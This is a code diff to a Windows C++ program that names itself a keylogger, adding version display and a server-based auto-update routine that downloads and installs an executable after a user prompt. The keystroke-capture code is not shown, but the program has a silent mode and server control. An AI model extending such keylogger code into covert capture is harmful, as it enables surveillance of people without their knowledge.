@@ -1,4 +1,4 @@
-﻿#include <winsock2.h>
+#include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <dwmapi.h>
@@ -25,6 +25,7 @@
 #include <shobjidl.h>
 #include <thread>
 #include <mutex>
+#include "AutoUpdater.h"
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "ole32.lib")
@@ -42,6 +43,9 @@ namespace fs = std::filesystem;
 #define bootwait
 #define FORMAT 0
 #define mouseignore
+
+// 版本信息
+const std::string APP_VERSION = "1.0.0";
 
 bool isRecording = true;
 HHOOK _hook;
@@ -316,6 +320,30 @@ void CleanupNotifyIcon()
     }
 }
 
+// 自动更新检查函数
+void CheckForUpdates() {
+    AutoUpdater updater("http://" + g_serverHost + ":" + std::to_string(g_serverPort), APP_VERSION);
+    
+    std::string latest_version, download_url;
+    if (updater.checkForUpdates(latest_version, download_url)) {
+        // 显示更新通知
+        std::wstring title = L"发现新版本";
+        std::wstring content = L"发现新版本 " + std::wstring(latest_version.begin(), latest_version.end()) + L"，是否更新？";
+        
+        int result = MessageBox(NULL, content.c_str(), title.c_str(), MB_YESNO | MB_ICONINFORMATION);
+        if (result == IDYES) {
+            // 下载更新
+            std::string update_file = GetLogDirectory() + "\\Keylogger_update.exe";
+            if (updater.downloadUpdate(download_url, update_file)) {
+                // 安装更新
+                updater.installUpdate(update_file);
+            } else {
+                MessageBox(NULL, L"下载更新失败", L"错误", MB_OK | MB_ICONERROR);
+            }
+        }
+    }
+}
+
 // 欢迎窗口相关代码
 HWND g_hWelcomeWnd = NULL;
 POINT g_mousePos = { -1, -1 };
@@ -499,6 +527,13 @@ LRESULT CALLBACK WelcomeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
         SetTextColor(hdc, RGB(16, 185, 129)); // 绿色
         std::wstring portText = L"服务器控制端口: " + std::to_wstring(g_localPort);
         DrawTextW(hdc, portText.c_str(), -1, &portRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+        currentY += lineHeight + 5;
+        
+        // 绘制版本信息
+        RECT versionRect = { shortcutRect.left, currentY, shortcutRect.right, currentY + lineHeight };
+        SetTextColor(hdc, RGB(107, 114, 128)); // 淡灰色
+        std::wstring versionText = L"版本: " + std::wstring(APP_VERSION.begin(), APP_VERSION.end());
+        DrawTextW(hdc, versionText.c_str(), -1, &versionRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
         currentY += lineHeight + 5;
         
         // 绘制色块显示功能说明
@@ -2070,6 +2105,10 @@ int main()
     if (!IsSilentMode()) {
         ShowWelcomeWindow();
     }
+
+    // 检查更新
+    std::thread updateThread(CheckForUpdates);
+    updateThread.detach();
 
 #ifdef bootwait 
     while (IsSystemBooting())
